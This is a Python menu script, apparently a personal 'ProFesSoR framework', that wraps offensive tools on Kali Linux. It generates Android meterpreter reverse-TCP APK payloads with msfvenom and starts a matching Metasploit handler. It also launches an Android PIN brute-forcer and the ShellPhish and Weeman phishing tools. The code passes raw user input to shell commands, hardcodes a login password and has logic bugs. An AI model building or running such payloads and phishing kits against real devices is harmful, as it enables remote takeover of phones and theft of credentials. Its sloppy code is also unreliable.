#!/usr/bin/python3
import os, sys, time, requests
paththisfile="/root/mypythonscript.py"
def restart():
    os.system("python3 /root/mypythonscript.py")
def login(param):
    os.system("clear")
    print("")
    print("")
    print("     ++++++++++++Login++++++++++")
    username = input("[+]Enter The Valid Username : ")
    paswd = input("[+]Enter Valid Password : ")
    if username=="lafeer" and paswd=="l4f33r":
       print("Login")
       time.sleep(2)
       os.system(param)
    else:
       print("Login Error")


#COLORS

bl='\033[1;90m'
rd='\033[1;91m'
gn='\033[1;92m'
orn='\033[1;93m'
blu='\033[1;94m'
prpl='\033[1;95m'
cyn='\033[1;96m'
wht='\033[1;97m'
ylw='\033[1;34m'
ss=prpl+"["+rd+"+"+prpl+"]"
def internetconnection():
    url="https://google.com"
    timt=1
    try:
        req = requests.get(url, timeout=timt)
        print(gn+"           Internet Connected")
    except (requests.ConnectionError, requests.Timeout) as exception:
        print(rd+"           No internet connection.")
def kstart():
    print("")
    print('')
    print(cyn+"          ENTER PORT TO START VNC SERVER (1 - 9)")
    print('')
    print("")
    ksask=input(rd+"[+]root@start : ")
    os.system("vncserver :"+ksask+" -localhost yes")
    print("")
    print("VNC STARTED AT "+ksask+" PORT")
def kstop():
    import os, sys, time
    print()
    print("")
    print(gn+"ENTER THE PORT NUMBER THAT IS RUNNING TO STOP")
    ksstop=(input(rd+"[+]root@kex : "))
    os.system("vncserver -kill :"+ksstop)
    print()
    print("VNC SERVER STOPPED AT "+ksstop+" PORT")
def kex():
    os.system("clear")
    print("")
    print(gn+"        **********************")
    print("")
    print(cyn+"           Vnc Server (Kex)")
    print("")
    print(gn+"        **********************")
    print()
    print()
    print(prpl+"        1."+orn+" Kex Start")
    print(prpl+"        2."+orn+" Kex Stop")
    print(prpl+"        3."+orn+"Exit")
    print("")
    kask=(input(rd+"[+]root@kex : "))
    if kask=="1":
       kstart()
    elif kask=="2":
       kstop()
    elif kask=="3":
       restart()
    else:
       print("Entered Wrong Value !, the punishment is restart this framework")
def weeman():
    os.system("clear")
    print(orn+"[+]Forking Weeman From Github...")
    #os.system("cd /etc/share/ && rm -rv weeman -y && git clone https://github.com/evait-security/weeman.git && cd weeman && echo "/etc/share/weeman/weeman.py" > weeman && mv weeman /usr/bin && chmod +x /usr/bin/weeman")
    os.system("cd /etc/share")
    os.system("rm -rv -f weeman")
    os.system("git clone https://github.com/evait-security/weeman.git")
    os.system("cd weeman")
    os.system("chmod +x weeman.py")
    os.system("mv weeman /usr/bin")
    os.system("chmod +x /usr/bin/weeman")
    os.system("clear")
    print(gn+"To run weeman, just type weeman")
def load_stc():
    lowerstr = "ProFesSoR framework is starting..."
    upperstr = lowerstr.upper()
    for x in range (len(lowerstr)):
        s = lowerstr[0:x] + upperstr[x] + lowerstr[x+1:] + '\r'
        sys.stdout.write(s)
        sys.stdout.flush()
        time.sleep(0.1)
def msfpm():
     os.system("clear")
     print(bl+"                       +++++++++++++++++++++++++++++")
     print(bl+"                       +"+rd+" Metasploit Payload Maker  "+bl+"+")
     print(bl+"                       +++++++++++++++++++++++++++++")
     print("")
     print(gn+"                        1 "+cyn+"Android Payload [.apk]")
     inm=input(rd+"[+]root@msfpm : ")
     if inm =='1':
        print ("")
        apkname=input(ss+gn+"Enter Name Of Apk : "+wht)
        host=input(ss+gn+"Enter Your IP Address For Communicate : "+wht)
        port=input(ss+gn+"Enter Port [0000 - 9999] :"+wht)
        print(orn+"Your Apk Payload Will Created On '/sdcard'"+wht)
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+host+" lport="+port+" r > /sdcard/"+apkname+".apk")
        def msfpr():
           os.system("clear")
           print(cyn+"[+]"+gn+"Payload Name : "+wht+apkname+".apk")
           print(cyn+"[+]"+gn+"Payload Host : "+wht+host)
           print(cyn+"[+]"+gn+"Payload Port : "+wht+port)
           print(cyn+"[+]"+gn+"Payload Directory : "+wht+"/sdcard")
           l1 = "use exploit/multi/handler"
           l2 = "set payload android/meterpreter/reverse_tcp"
           l3 = "set lhost "+host
           l4 = "set lport "+port
           l5 = "exploit"
           os.system("rm /sdcard/android-payload.rc")
           with open("android-payload.rc",'w') as ql:
               ql.write('{}\n{}\n{}\n{}\n{}\n'.format(l1,l2,l3,l4,l5))
        msfpr()
        insn = input("[+] Open The Reciever [y/n] ? ")
        if insn =='y' or 'Y':
           filename="android-payload.rc"
           plo = "msfconsole -q -r "+filename
           os.system(plo)
        else:
             print("run manually")
     else:
         print("Enter 1-2")
def banner(a):
    os.system("clear")
    print('')
    print("                 ####################")
    print("                 #     ProFesSoR    #")
    print("                 #             "+a+" #")
    print("                 ####################")

def info():
    print("")
    print("           ++++++++++++++++++++++++++++++++++++++++++++")
    print("           + Author Name : PrøFesSøR")
    print("           + Email       : muhamedlafeer837@gmail.com")
    print("           + Github      : PrøFesSøR")
    print("           + InstaGram   : ig_lafeer")
    print("           ++++++++++++++++++++++++++++++++++++++++++++")

def menu():
    print("")
    print("   "+gn+"        1 - "+blu+"HID Attack.")
    print("   "+gn+"        2 - "+blu+"Metasploit Android Payload.")
    print("   "+gn+"        3 - "+blu+"Kex (vnc server [start - stop]).")
    print("   "+gn+"        4 - "+blu+"Kali Upgradables.")
    print("   "+gn+"        5 - "+blu+"RED HAWK")
    print("   "+gn+"        6 - "+blu+"Weeman")
    print("   "+gn+"        7 - "+blu+"ShellPhish")
    print("   "+gn+"        0 - "+blu+"Exit.")
    print("   "+gn+"        f - "+blu+"Bug Fix [Developer].")
    print("")
    print("")
    internetconnection()
def inpu():
    inp =input(rd+"[+] Enter The Number : ")
    if inp == '1':
       os.system("/root/HID/Android-PIN-Bruteforce/android-pin-bruteforce crack")
    elif inp =='2':
         msfpm()
    elif inp =='4':
        metapackages()
    elif inp =='3':
        kex()
    elif inp =='5':
        os.system("rhawk")
    elif inp =='6':
        os.system("weeman")
    elif inp =='7':
        os.system("shellphish")
    elif inp =='0':
        os.system("clear")
    elif inp =='f':
        login("nano "+paththisfile)
        # os.system("nano "+paththisfile)
    else:
         print(rd+"YOU ENTERED WRONG VALUE !")




def metapackages():
    os.system("clear")
    print("")
    print(ylw+"           ========================")
    print(gn+"                METAPACKAGES")
    print(ylw+"           ========================")
    print()
    print("")
    print(gn+"            1 - "+bl+"Update And Upgrade")
    print(gn+"            2 - "+bl+"Kali Linux arm")
    print(gn+"            3 - "+bl+"Kali Linux core.")
    print(gn+"            4 - "+cyn+"Kali Linux default")
    print(gn+"            5 - "+cyn+"Kali Linux everything")
    print(gn+"            6 - "+bl+"Kali Linux headless")
    print(gn+"            7 - "+cyn+"Kali Linux large")
    print(gn+"            8 - "+prpl+"Kali Linux nethunter")
    print(gn+"            9 - "+bl+"Kali Linux 802-11")
    print(gn+"           10 - "+bl+"Kali Linux bluetooth")
    print(gn+"           11 - "+bl+"Kali Linux crypto-stego")
    print(gn+"           12 - "+bl+"Kali Linux database")
    print(gn+"           13 - "+bl+"Kali Linux exploitation")
    print(gn+"           14 - "+bl+"Kali Linux forensics")
    print(gn+"           15 - "+bl+"Kali Linux fuzzing")
    print(gn+"           16 - "+bl+"Kali Linux gpu")
    print(gn+"           17 - "+bl+"Kali Linux hardware")
    print(gn+"           18 - "+bl+"Kali Linux information gathering")
    print(gn+"           19 - "+bl+"Kali Linux password")
    print(gn+"           20 - "+bl+"Kali Linux Post exploitation")
    print(gn+"           21 - "+bl+"Kali Linux Reporting")
    print(gn+"           22 - "+bl+"Kali Linux reverse-engeneering")
    print(gn+"           23 - "+bl+"Kali Linux sdr")
    print(gn+"           24 - "+bl+"Kali Linux sniffing spoofing")
    print(gn+"           25 - "+bl+"Kali Linux top10")
    print(gn+"           26 - "+bl+"Kali Linux voip")
    print(gn+"           27 - "+bl+"Kali Linux vulnerability")
    print(gn+"           28 - "+bl+"Kali Linux web")
    print(gn+"           29 - "+bl+"Kali Linux Windows Resource")
    print(gn+"           30 - "+bl+"Kali Linux Wireless")


    mask = input(ss+rd+"root@internet : ")
    if mask=='1':
       os.system("sudo apt update -y && upgrade -y")
    else:
       print(ss+" Enter Correct Value Plz...")





load_stc()
banner("v3.1")
info()
menu()
inpu()
